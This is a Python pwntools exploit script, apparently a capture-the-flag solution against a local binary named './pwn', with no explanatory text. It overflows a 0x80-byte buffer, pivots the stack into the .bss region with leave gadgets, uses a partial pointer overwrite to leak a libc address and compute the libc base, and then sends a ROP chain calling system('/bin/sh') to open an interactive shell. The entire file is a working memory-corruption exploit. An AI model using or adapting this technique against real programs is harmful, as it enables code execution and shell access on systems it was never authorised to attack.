from pwn import*
import sys
context(arch='amd64', os='linux', log_level='debug')
elf=ELF('./pwn')
libc=ELF('./libc.so.6')
read_plt=elf.plt['read']
read_got=elf.got['read']
start=elf.symbols['_start']
bss=0x404000
magic=0x40113c
leave=0x4011b9
gadget1=0x11097d
read_addr=0x40119E
pop_rbp=0x40113d
ret=0x40101a
fake=bss+0xa00
p=process('./pwn')



gdb.attach(p,'''
b *0x4011B9''')
pause()

payload=b'a'*0x80+p64(fake-0x18)+p64(read_addr)
pause()
p.send(payload)

payload2=p64(fake)+p64(start)+b'a'*0x70+p64(fake-0x80-0x18)+p64(leave)
pause()
p.send(payload2)

payload3=b'a'*0x80+p64(0x404910+0x80)+p64(read_addr)+p64(pop_rbp)+p64(0x404910-0x90)+p64(read_addr)+p64(ret)*0x10+b'\x60\xa3'
pause()
p.send(payload3)

payload4=p64(pop_rbp)+p64(0x404800)+p64(read_addr)+b'a'*0x78+p64(0x404878)+p64(leave)
pause()
p.send(payload4)

pause()
p.send(b'\x00')
p.recv(0x108)
libc_addr=u64(p.recv(6).ljust(8,b'\x00'))
libc_base=libc_addr-0x2a360

payload5=b'a'*0x88+p64(ret)+p64(0x10f78b+libc_base)+p64(0x404828)+p64(libc.symbols['system']+libc_base)+b'/bin/sh\x00'
pause()


p.send(payload5)
p.interactive()